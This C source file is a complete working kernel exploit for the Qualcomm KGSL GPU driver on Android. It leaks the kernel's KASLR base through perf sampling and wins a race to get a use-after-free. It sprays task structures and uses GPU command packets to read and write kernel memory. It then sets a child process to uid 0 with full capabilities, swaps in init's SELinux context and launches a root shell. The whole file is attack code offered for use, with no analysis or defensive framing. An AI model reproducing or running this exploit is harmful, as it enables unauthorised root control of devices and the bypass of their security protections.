#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <stdbool.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <pthread.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sched.h>
#include <sys/prctl.h>
#include <signal.h>
#include <sys/syscall.h>
#include <linux/perf_event.h>
#include <asm/unistd.h>
#include <sys/wait.h>
#include <sys/select.h>
#include <poll.h>
#include <sys/stat.h>

#define KGSL_IOC_TYPE 0x09

struct kgsl_gpuobj_alloc {
    uint64_t size; uint64_t flags; uint64_t va_len;
    uint64_t mmapsize; unsigned int id;
    unsigned int metadata_len; uint64_t metadata;
};
#define IOCTL_KGSL_GPUOBJ_ALLOC _IOWR(KGSL_IOC_TYPE, 0x45, struct kgsl_gpuobj_alloc)

struct kgsl_gpuobj_free { uint64_t flags; uint64_t priv; unsigned int id; unsigned int type; unsigned int len; unsigned int __pad; };
#define IOCTL_KGSL_GPUOBJ_FREE _IOW(KGSL_IOC_TYPE, 0x46, struct kgsl_gpuobj_free)

struct kgsl_gpuobj_info { uint64_t gpuaddr, flags, size, va_len, va_addr; unsigned int id; };
#define IOCTL_KGSL_GPUOBJ_INFO _IOWR(KGSL_IOC_TYPE, 0x47, struct kgsl_gpuobj_info)

struct kgsl_gpuobj_import { uint64_t priv; uint64_t priv_len; uint64_t flags; unsigned int type; unsigned int id; };
#define IOCTL_KGSL_GPUOBJ_IMPORT _IOWR(KGSL_IOC_TYPE, 0x48, struct kgsl_gpuobj_import)

struct kgsl_gpuobj_import_useraddr { uint64_t virtaddr; };

struct kgsl_drawctxt_create { unsigned int flags; unsigned int drawctxt_id; };
#define IOCTL_KGSL_DRAWCTXT_CREATE _IOWR(KGSL_IOC_TYPE, 0x13, struct kgsl_drawctxt_create)

struct kgsl_command_object { uint64_t offset; uint64_t gpuaddr; uint64_t size; unsigned int flags; unsigned int id; };

struct kgsl_gpu_command {
    uint64_t flags; uint64_t cmdlist; unsigned int cmdsize, numcmds;
    uint64_t objlist; unsigned int objsize, numobjs;
    uint64_t synclist; unsigned int syncsize, numsyncs;
    unsigned int context_id, timestamp;
};
#define IOCTL_KGSL_GPU_COMMAND _IOWR(KGSL_IOC_TYPE, 0x4A, struct kgsl_gpu_command)

struct kgsl_cmdstream_readtimestamp_ctxtid { unsigned int context_id, type, timestamp; };
#define IOCTL_KGSL_CMDSTREAM_READTIMESTAMP_CTXTID _IOWR(KGSL_IOC_TYPE, 0x16, struct kgsl_cmdstream_readtimestamp_ctxtid)

#define KGSL_MEMFLAGS_USE_CPU_MAP (1ULL << 28)
#define KGSL_CACHEMODE_SHIFT 0
#define KGSL_CACHEMODE_MASK 3
#define KGSL_CACHEMODE_WRITEBACK 3
#define KGSL_USER_MEM_TYPE_ADDR 2
#define KGSL_CONTEXT_PREAMBLE 0x00000010
#define KGSL_CONTEXT_NO_GMEM_ALLOC 0x00000002
#define KGSL_CMDLIST_IB 0x00000001U
#define KGSL_TIMESTAMP_RETIRED 0x00000002

#define UAF_ADDR  0x7001ff000ULL
#define UAF_SIZE  0x10004000ULL
#define OVERLAP_ADDR 0x7001fe000ULL
#define OVERLAP_SIZE 0x7000ULL
#define BOGUS_ADDR 0x700204000ULL
#define BOGUS_SIZE 0xffffffffffefd000ULL
#define PLACEHOLDER_ADDR 0x710204000ULL
#define PLACEHOLDER_SIZE 0x10400000ULL

#define VMLINUX_TEXT      0xffffffc010080000ULL
#define VMLINUX_INIT_CRED 0xffffffc012197d08ULL
#define VMLINUX_SELINUX_STATE 0xffffffc0123a4000ULL
#define VMLINUX_SELINUX_ENFORCING_BOOT 0xffffffc01240744cULL

#define SPRAY_PIDS 2000
#define SCAN_DWORDS 560

static int kgsl_fd = -1;
static volatile int race_done = 0;
static volatile int dc_civac_works = -1;

static void sigill_handler(int sig) { dc_civac_works = 0; }

static void try_dc_civac(void *addr) {
    if (dc_civac_works == 0) return;
    void *old = signal(SIGILL, sigill_handler);
    __sync_synchronize();
    asm volatile("dc civac, %0" : : "r"(addr) : "memory");
    asm volatile("dsb sy" : : : "memory");
    __sync_synchronize();
    signal(SIGILL, old);
    if (dc_civac_works == -1) dc_civac_works = 1;
}

static void flush_dc_civac_range(void *start, size_t len) {
    if (dc_civac_works != 1) return;
    char *p = (char*)((uintptr_t)start & ~63);
    char *end = (char*)((uintptr_t)start + len);
    for (; p < end; p += 64) try_dc_civac(p);
}

static void die(const char *msg) { perror(msg); exit(1); }

static long perf_open(struct perf_event_attr *attr, pid_t pid, int cpu, int group_fd, unsigned long flags) {
    return syscall(__NR_perf_event_open, attr, pid, cpu, group_fd, flags);
}

static uint64_t detect_kaslr(void) {
    struct perf_event_attr pe = {0};
    pe.type = PERF_TYPE_HARDWARE;
    pe.size = sizeof(pe);
    pe.config = PERF_COUNT_HW_CPU_CYCLES;
    pe.sample_type = PERF_SAMPLE_IP;
    pe.sample_period = 100;
    pe.disabled = 1;
    pe.exclude_kernel = 0; pe.exclude_hv = 1; pe.exclude_user = 1;

    int fd = perf_open(&pe, 0, -1, -1, 0);
    if (fd < 0) { printf("  perf_open: errno=%d\n", errno); return 0; }

    int npages = 256;
    size_t mmap_size = (1 + npages) * 4096;
    void *buf = mmap(NULL, mmap_size, PROT_READ|PROT_WRITE, MAP_SHARED, fd, 0);
    if (buf == MAP_FAILED) { close(fd); return 0; }

    ioctl(fd, PERF_EVENT_IOC_RESET, 0);
    ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);
    usleep(500000);
    ioctl(fd, PERF_EVENT_IOC_DISABLE, 0);

    struct perf_event_mmap_page *pmp = (struct perf_event_mmap_page *)buf;
    uint64_t head = pmp->data_head;
    uint64_t tail = pmp->data_tail;

    uint8_t *data = (uint8_t *)buf + pmp->data_offset;
    uint64_t data_size = pmp->data_size;

    uint64_t first_kernel_ip = 0;
    int n_ips = 0;

    while (tail < head) {
        uint64_t idx = tail & (data_size - 1);
        struct perf_event_header *hdr = (struct perf_event_header *)(data + idx);
        if (hdr->type == PERF_RECORD_SAMPLE && (hdr->misc & PERF_RECORD_MISC_KERNEL)) {
            n_ips++;
            uint64_t ip = *(uint64_t *)(hdr + 1);
            if (first_kernel_ip == 0) first_kernel_ip = ip;
            if (n_ips <= 3) printf("    IP[%d]=0x%lX\n", n_ips, (unsigned long)ip);
        }
        tail += hdr->size;
    }

    munmap(buf, mmap_size); close(fd);
    printf("    kernel_samples=%d\n", n_ips);

    if (n_ips == 0) { printf("  perf: no kernel IPs\n"); return 0; }

    uint64_t kaslr = (first_kernel_ip - VMLINUX_TEXT) & ~0x1FFFFFULL;
    uint64_t ic_addr = VMLINUX_INIT_CRED + kaslr;
    printf("    first_kernel_ip=0x%lX kaslr=0x%lX init_cred=0x%lX\n",
        (unsigned long)first_kernel_ip, (unsigned long)kaslr, (unsigned long)ic_addr);
    return ic_addr;
}

static int gpuobj_alloc(int fd, uint64_t size, uint64_t flags) {
    struct kgsl_gpuobj_alloc a = { .size = size, .flags = flags };
    if (ioctl(fd, IOCTL_KGSL_GPUOBJ_ALLOC, &a) < 0) die("gpuobj_alloc");
    return a.id;
}

static void *gpuobj_mmap(int fd, size_t size, unsigned int id) {
    void *p = mmap(NULL, size, PROT_READ|PROT_WRITE, MAP_SHARED, fd, (off_t)id << 12);
    if (p == MAP_FAILED) die("gpuobj_mmap");
    return p;
}

static int gpuobj_info(int fd, unsigned int id, uint64_t *gpuaddr, uint64_t *flags) {
    struct kgsl_gpuobj_info inf = { .id = id };
    int ret = ioctl(fd, IOCTL_KGSL_GPUOBJ_INFO, &inf);
    if (ret == 0) {
        if (gpuaddr) *gpuaddr = inf.gpuaddr;
        if (flags) *flags = inf.flags;
    }
    return ret;
}

static void gpuobj_free(int fd, unsigned int id) {
    struct kgsl_gpuobj_free f = { .id = id };
    if (ioctl(fd, IOCTL_KGSL_GPUOBJ_FREE, &f) < 0) die("gpuobj_free");
}

static unsigned int create_context(int fd) {
    struct kgsl_drawctxt_create c = { .flags = KGSL_CONTEXT_PREAMBLE | KGSL_CONTEXT_NO_GMEM_ALLOC };
    if (ioctl(fd, IOCTL_KGSL_DRAWCTXT_CREATE, &c) < 0) die("create_context");
    return c.drawctxt_id;
}

static int wait_timestamp(int fd, unsigned int ctx_id, unsigned int target) {
    struct kgsl_cmdstream_readtimestamp_ctxtid r = { .context_id = ctx_id, .type = KGSL_TIMESTAMP_RETIRED };
    for (int i = 0; i < 100000; i++) {
        if (ioctl(fd, IOCTL_KGSL_CMDSTREAM_READTIMESTAMP_CTXTID, &r) != 0) return -1;
        if (r.timestamp >= target) return 0;
        usleep(100);
    }
    return -2;
}

static uint32_t pm4_parity(uint32_t v) {
    return (0x9669 >> (0xF & (v ^ (v>>4) ^ (v>>8) ^ (v>>12) ^ (v>>16) ^ (v>>20) ^ (v>>24) ^ (v>>28)))) & 1;
}

static uint32_t cp_type7(uint32_t opcode, uint32_t cnt) {
    return (7<<28) | (cnt&0x3FFF) | (pm4_parity(cnt)<<15) | ((opcode&0x7F)<<16) | (pm4_parity(opcode)<<23);
}
#define CP_NOP 0x10
#define CP_MEM_WRITE 0x3D
#define CP_MEM_TO_MEM 0x73
#define CP_WAIT_MEM_WRITES 0x12
#define CP_EVENT_WRITE 0x46
#define CACHE_FLUSH_TS 0x1C

static void split64(uint64_t addr, uint32_t *lo, uint32_t *hi) {
    *lo = (uint32_t)addr; *hi = (uint32_t)(addr >> 32);
}

static int submit_ib(int fd, unsigned int ctx_id, uint64_t ib_gpuaddr,
    size_t ib_bytes, unsigned int ib_id, unsigned int *out_ts) {
    struct kgsl_command_object cmd_obj = {
        .gpuaddr = ib_gpuaddr, .size = ib_bytes,
        .flags = KGSL_CMDLIST_IB, .id = ib_id
    };
    struct kgsl_gpu_command gc = {0};
    gc.cmdlist = (uint64_t)(uintptr_t)&cmd_obj;
    gc.cmdsize = sizeof(cmd_obj);
    gc.numcmds = 1;
    gc.context_id = ctx_id;
    int ret = ioctl(fd, IOCTL_KGSL_GPU_COMMAND, &gc);
    if (out_ts) *out_ts = gc.timestamp;
    return ret;
}

static void *race_thread(void *arg) {
    struct kgsl_gpuobj_import_useraddr uaddr = { .virtaddr = BOGUS_ADDR };
    struct kgsl_gpuobj_import imp = {
        .priv = (uint64_t)&uaddr, .priv_len = BOGUS_SIZE,
        .flags = KGSL_MEMFLAGS_USE_CPU_MAP, .type = KGSL_USER_MEM_TYPE_ADDR,
    };
    while (!race_done) ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_IMPORT, &imp);
    return NULL;
}

static int read_mem(uint64_t addr, uint32_t *buf, int dwords, int ctx_id,
                    uint64_t ib_ga, unsigned int ib_id, uint64_t dst_ga,
                    void *ib_m, void *dst_m) {
    uint32_t *cmd = (uint32_t *)ib_m;
    memset(ib_m, 0, 0x10000);
    memset(dst_m, 0, dwords * 4);
    int dw = 0;
    cmd[dw++] = cp_type7(CP_NOP, 0);
    for (int i = 0; i < dwords; i++) {
        uint32_t dl, dh, sl, sh;
        split64(dst_ga + i * 4, &dl, &dh);
        split64(addr + i * 4, &sl, &sh);
        cmd[dw++] = cp_type7(CP_MEM_TO_MEM, 5);
        cmd[dw++] = 0;
        cmd[dw++] = dl; cmd[dw++] = dh;
        cmd[dw++] = sl; cmd[dw++] = sh;
    }
    cmd[dw++] = cp_type7(CP_NOP, 0);
    __sync_synchronize();
    unsigned int ts;
    if (submit_ib(kgsl_fd, ctx_id, ib_ga, dw*4, ib_id, &ts) < 0) return -1;
    if (wait_timestamp(kgsl_fd, ctx_id, ts) < 0) return -1;
    __sync_synchronize();
    memcpy(buf, dst_m, dwords * 4);
    return 0;
}

static int write_mem(uint64_t addr, uint32_t *data, int dwords, int ctx_id,
                     uint64_t ib_ga, unsigned int ib_id, void *ib_m) {
    uint32_t *cmd = (uint32_t *)ib_m;
    memset(ib_m, 0, 0x10000);
    int dw = 0;
    cmd[dw++] = cp_type7(CP_NOP, 0);
    for (int i = 0; i < dwords; i++) {
        uint32_t sl, sh;
        split64(addr + i * 4, &sl, &sh);
        cmd[dw++] = cp_type7(CP_MEM_WRITE, 4);
        cmd[dw++] = sl; cmd[dw++] = sh;
        cmd[dw++] = data[i];
        cmd[dw++] = 0;
    }
    cmd[dw++] = cp_type7(CP_NOP, 0);
    __sync_synchronize();
    unsigned int ts;
    if (submit_ib(kgsl_fd, ctx_id, ib_ga, dw*4, ib_id, &ts) < 0) return -1;
    if (wait_timestamp(kgsl_fd, ctx_id, ts) < 0) return -1;
    return 0;
}

static int find_security_offset(uint64_t task_addr, uint64_t cred_sec_ptr,
                                int ctx_id, uint64_t ib_ga, unsigned int ib_id,
                                uint64_t dst_ga, void *ib_m, void *dst_m) {
    uint32_t buf[SCAN_DWORDS];
    if (read_mem(task_addr, buf, SCAN_DWORDS, ctx_id, ib_ga, ib_id, dst_ga, ib_m, dst_m) < 0)
        return -1;
    uint64_t target = cred_sec_ptr;
    for (int i = 0; i < SCAN_DWORDS - 1; i++) {
        uint64_t val = (uint64_t)buf[i] | ((uint64_t)buf[i+1] << 32);
        if (val == target) {
            return i * 4;
        }
    }
    return -1;
}

int main(int argc, char **argv) {
    setbuf(stdout, NULL);

    kgsl_fd = open("/dev/kgsl-3d0", O_RDWR);
    if (kgsl_fd < 0) die("open kgsl");
    printf("[+] kgsl fd=%d\n", kgsl_fd);

    printf("[*] Phase 0: Early KASLR detection\n");
    uint64_t init_cred_addr = detect_kaslr();
    printf("  init_cred=0x%lX\n", init_cred_addr);
    if (!init_cred_addr) {
        fprintf(stderr, "Failed to detect KASLR\n");
        close(kgsl_fd);
        return 1;
    }

    printf("[*] Phase 1: Setup rbtree\n");
    uint64_t alloc_flags = KGSL_MEMFLAGS_USE_CPU_MAP | KGSL_CACHEMODE_WRITEBACK;
    int uaf_id = gpuobj_alloc(kgsl_fd, UAF_SIZE, alloc_flags);
    void *uaf_m = mmap((void*)UAF_ADDR, UAF_SIZE, PROT_READ|PROT_WRITE,
        MAP_SHARED|MAP_FIXED, kgsl_fd, (off_t)uaf_id << 12);
    if (uaf_m == MAP_FAILED) die("mmap UAF");
    munmap(uaf_m, UAF_SIZE);

    if (mmap((void*)BOGUS_ADDR, 0x1000, PROT_READ|PROT_WRITE,
        MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED, -1, 0) == MAP_FAILED) die("mmap BOGUS");

    int ph_id = gpuobj_alloc(kgsl_fd, PLACEHOLDER_SIZE, alloc_flags);
    void *ph_m = mmap((void*)PLACEHOLDER_ADDR, PLACEHOLDER_SIZE, PROT_READ|PROT_WRITE,
        MAP_SHARED|MAP_FIXED, kgsl_fd, (off_t)ph_id << 12);
    if (ph_m == MAP_FAILED) die("mmap PLACEHOLDER");

    printf("[*] Phase 2: Race\n");
    int ov_id = gpuobj_alloc(kgsl_fd, OVERLAP_SIZE, alloc_flags);
    pthread_t thr;
    if (pthread_create(&thr, NULL, race_thread, NULL) != 0) die("pthread");

    int hit = 0;
    for (int i = 0; i < 5000000; i++) {
        void *r = mmap((void*)OVERLAP_ADDR, OVERLAP_SIZE,
            PROT_READ|PROT_WRITE, MAP_SHARED|MAP_FIXED,
            kgsl_fd, (off_t)ov_id << 12);
        int e = errno;
        if (r != MAP_FAILED) { munmap(r, OVERLAP_SIZE); hit = 1; break; }
        if (e == ENODEV) { hit = 1; break; }
        if (i % 500000 == 0) printf("  race %d/5000000 errno=%d\n", i, e);
    }

    race_done = 1;
    pthread_join(thr, NULL);
    if (!hit) { printf("[-] Race failed\n"); close(kgsl_fd); return 1; }
    printf("[+] Race won!\n");

    printf("[*] Phase 3: Free UAF\n");
    gpuobj_free(kgsl_fd, uaf_id);
    printf("[+] UAF freed\n");

    printf("[*] Phase 4: Reclaim pages\n");
    int rf = open("/proc/sys/vm/compact_memory", O_WRONLY);
    if (rf >= 0) { write(rf, "1", 1); close(rf); }
    rf = open("/proc/sys/vm/drop_caches", O_WRONLY);
    if (rf >= 0) { write(rf, "3", 1); close(rf); }
    usleep(10000);

    printf("[*] Phase 5: Spawning task_struct spray...\n");
    int notify_pipe[2];
    if (pipe(notify_pipe) < 0) die("pipe");
    fcntl(notify_pipe[0], F_SETFD, FD_CLOEXEC);
    fcntl(notify_pipe[1], F_SETFD, FD_CLOEXEC);

    pid_t spray_pids[SPRAY_PIDS];
    int n_spray = 0;
    for (int i = 0; i < SPRAY_PIDS; i++) {
        pid_t p = fork();
        if (p == 0) {
            close(notify_pipe[0]);
            prctl(PR_SET_NAME, "TASKUAF!!");
            for (int j = 0; j < 1800; j++) {
                usleep(200000);
                if (getuid() == 0) {
                    usleep(50000);
                    pid_t me = getpid();
                    write(notify_pipe[1], &me, sizeof(me));
                    write(1, "### ROOT SHELL ACTIVE ###\n", 26);
                    close(notify_pipe[1]);
                    usleep(50000);
                    execl("/system/bin/sh", "sh", NULL);
                    _exit(0);
                }
            }
            close(notify_pipe[1]);
            _exit(0);
        }
        if (p > 0) spray_pids[n_spray++] = p;
        else break;
    }
    close(notify_pipe[1]);
    printf("  Spawned %d children\n", n_spray);

    printf("[*] Phase 7: GPU scan for task_structs\n");
    unsigned int ctx_id = create_context(kgsl_fd);
    printf("  context=%u\n", ctx_id);

    int ib_id = gpuobj_alloc(kgsl_fd, 0x10000, alloc_flags);
    void *ib_m = gpuobj_mmap(kgsl_fd, 0x10000, ib_id);
    uint64_t ib_ga = 0, ib_flags = 0;
    gpuobj_info(kgsl_fd, ib_id, &ib_ga, &ib_flags);

    int dst_id = gpuobj_alloc(kgsl_fd, 0x4000, alloc_flags);
    void *dst_m = gpuobj_mmap(kgsl_fd, 0x4000, dst_id);
    uint64_t dst_ga = 0, dst_flags = 0;
    gpuobj_info(kgsl_fd, dst_id, &dst_ga, &dst_flags);

    uint64_t end_va = UAF_ADDR + UAF_SIZE - 0x1000;
    uint64_t task_pages[16];
    int n_task = 0;
    uint64_t cred_pages[32];
    int cred_offs[32];
    int n_cred = 0;

    uint64_t scan_start = UAF_ADDR + 0x300000;
    if (scan_start < UAF_ADDR + 0x2000) scan_start = UAF_ADDR + 0x2000;

    for (uint64_t va = scan_start; va < end_va && (n_task < 1 || n_cred < 1); va += 0x1000) {
        if (((va - scan_start) & 0xFFFFF) == 0) { printf("."); fflush(stdout); }
        uint32_t cmd_buf[SCAN_DWORDS];
        if (read_mem(va, cmd_buf, SCAN_DWORDS, ctx_id, ib_ga, ib_id, dst_ga, ib_m, dst_m) < 0) break;

        int n_comm = 0, comm_off = -1;
        for (int i = 0; i < SCAN_DWORDS - 1; i++) {
            if (cmd_buf[i] == 0x4B534154 && cmd_buf[i+1] == 0x21464155) {
                if (comm_off < 0) comm_off = i * 4;
                n_comm++;
            }
        }

        if (n_comm > 0) {
            printf("  [TASK_COMM] va=0x%lx comm_off=0x%x\n", (unsigned long)va, comm_off);
            task_pages[n_task++] = va;
        }

        for (int off = 0x700; off < 0x800; off += 4) {
            uint64_t ptr = (uint64_t)cmd_buf[off/4] | ((uint64_t)cmd_buf[off/4+1] << 32);
            if (ptr >= 0xffffffc000000000ULL && ptr < 0xffffffd000000000ULL) {
                uint32_t cred_buf[8];
                if (read_mem(ptr, cred_buf, 8, ctx_id, ib_ga, ib_id, dst_ga, ib_m, dst_m) == 0) {
                    if (cred_buf[1] == 2000) {
                        printf("  [CRED] va=0x%lx off=0x%x cred=0x%lx\n", (unsigned long)va, off, ptr);
                        cred_pages[n_cred] = va;
                        cred_offs[n_cred] = off;
                        n_cred++;
                        break;
                    }
                }
            }
        }
    }
    printf("[*] Scan complete: found %d task_struct pages, %d cred pages\n", n_task, n_cred);

    if (n_cred == 0) {
        printf("[-] Could not find cred offset\n");
        goto cleanup;
    }

    // Read init_cred->security (this points to init's task_security_struct)
    uint64_t inc_sec = 0;
    {
        uint32_t buf[2];
        if (read_mem(init_cred_addr + 0x78, buf, 2, ctx_id, ib_ga, ib_id, dst_ga, ib_m, dst_m) == 0) {
            inc_sec = (uint64_t)buf[0] | ((uint64_t)buf[1] << 32);
            printf("  init_cred->security = 0x%lx\n", inc_sec);
        } else {
            printf("[-] Failed to read init_cred->security\n");
            goto cleanup;
        }
    }

    // Read init's SID (first dword of the security struct)
    uint32_t init_sid = 0;
    {
        uint32_t buf[1];
        if (read_mem(inc_sec, buf, 1, ctx_id, ib_ga, ib_id, dst_ga, ib_m, dst_m) == 0) {
            init_sid = buf[0];
            printf("  init SID = 0x%08x\n", init_sid);
        } else {
            printf("[-] Failed to read init SID\n");
            goto cleanup;
        }
    }

    // For each found task, overwrite its cred and also set task->security to point to init's security.
    for (int p = 0; p < n_cred; p++) {
        uint64_t task_addr = cred_pages[p];
        uint64_t cbase = task_addr + cred_offs[p];

        // 1) Read current cred->security pointer (before we overwrite it)
        uint32_t old_sec[2];
        if (read_mem(cbase + 0x78, old_sec, 2, ctx_id, ib_ga, ib_id, dst_ga, ib_m, dst_m) < 0) {
            printf("[-] Failed to read cred->security for task %d\n", p);
            continue;
        }
        uint64_t old_sec_ptr = (uint64_t)old_sec[0] | ((uint64_t)old_sec[1] << 32);

        // 2) Write uid=0 and capabilities
        uint32_t data[21];
        memset(data, 0, sizeof(data));
        data[1] = 0x00000004; // uid=0
        data[4] = 0xFFFFFFFF; data[5] = 0x0000003F;
        data[6] = 0xFFFFFFFF; data[7] = 0x0000003F;
        data[8] = 0xFFFFFFFF; data[9] = 0x0000003F;
        if (write_mem(cbase + 0x04, data, 21, ctx_id, ib_ga, ib_id, ib_m) < 0) {
            printf("[-] Failed to write uid/caps for task %d\n", p);
            continue;
        }

        // 3) Write cred->security to point to init's security struct
        uint32_t sec_ptr[2];
        split64(inc_sec, &sec_ptr[0], &sec_ptr[1]);
        if (write_mem(cbase + 0x78, sec_ptr, 2, ctx_id, ib_ga, ib_id, ib_m) < 0) {
            printf("[-] Failed to write cred->security for task %d\n", p);
            continue;
        }

        // 4) Write task->real_cred and task->cred to point to our modified cred
        uint32_t ptr_lo, ptr_hi;
        split64(cbase, &ptr_lo, &ptr_hi);
        if (write_mem(task_addr + 0x738, &ptr_lo, 2, ctx_id, ib_ga, ib_id, ib_m) < 0) continue;
        if (write_mem(task_addr + 0x740, &ptr_lo, 2, ctx_id, ib_ga, ib_id, ib_m) < 0) continue;

        // 5) Find and set task->security to point to init's security struct
        // Scan the task page for a pointer that matches old_sec_ptr (the original task->security)
        int sec_off = find_security_offset(task_addr, old_sec_ptr, ctx_id,
                                           ib_ga, ib_id, dst_ga, ib_m, dst_m);
        if (sec_off >= 0 && sec_off < 0x1000) {
            if (write_mem(task_addr + sec_off, sec_ptr, 2, ctx_id, ib_ga, ib_id, ib_m) < 0) {
                printf("[-] Failed to write task->security at offset 0x%x\n", sec_off);
            } else {
                printf("[+] task->security offset found: 0x%x, written to init's security\n", sec_off);
            }
        } else {
            // Try common offsets for arm64 if scanning fails
            int common_offs[] = {0x7D8, 0x7E0, 0x7E8};
            int written = 0;
            for (int i = 0; i < 3; i++) {
                if (write_mem(task_addr + common_offs[i], sec_ptr, 2, ctx_id, ib_ga, ib_id, ib_m) == 0) {
                    printf("[+] Wrote task->security at common offset 0x%x\n", common_offs[i]);
                    written = 1;
                    break;
                }
            }
            if (!written) {
                printf("[-] Could not set task->security\n");
            }
        }

        // 6) Verify uid
        uint32_t uid_buf[1];
        if (read_mem(cbase + 0x04, uid_buf, 1, ctx_id, ib_ga, ib_id, dst_ga, ib_m, dst_m) == 0) {
            printf("  CRED[%d]: uid=0x%08X %s\n", p, uid_buf[0], uid_buf[0] == 0 ? "OK" : "FAIL");
        }
    }

    // Cache eviction
    void *ev = mmap(0, 0x2000000, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
    if (ev != MAP_FAILED) {
        volatile char *p = (volatile char *)ev;
        for (uint64_t o = 0; o < 0x2000000; o += 64) p[o] = 0;
        munmap(ev, 0x2000000);
    }
    sleep(1);

    printf("[*] Waiting for root shell...\n");
    close(notify_pipe[1]);
    struct pollfd pfd = { .fd = notify_pipe[0], .events = POLLIN };
    pid_t winner = 0;
    if (poll(&pfd, 1, 10000) > 0 &&
        read(notify_pipe[0], &winner, sizeof(winner)) == sizeof(winner)) {
        printf("[+] ROOT! uid=0 at PID %d\n", winner);
        for (int i = 0; i < n_spray; i++)
            if (spray_pids[i] != winner) kill(spray_pids[i], SIGKILL);
        while (waitpid(-1, NULL, WNOHANG) > 0);
        printf("\n  # ROOT SHELL (uid=0) - type exit to quit\n  # ");
        fflush(stdout);
        waitpid(winner, NULL, 0);
        printf("[-] Root shell exited\n");
    } else {
        printf("[-] No child got uid=0\n");
    }
    close(notify_pipe[0]);

cleanup:
    for (int i = 0; i < n_spray; i++) kill(spray_pids[i], SIGKILL);
    while (wait(NULL) > 0);
    close(kgsl_fd);
    printf("[*] Done.\n");
    return 0;
}
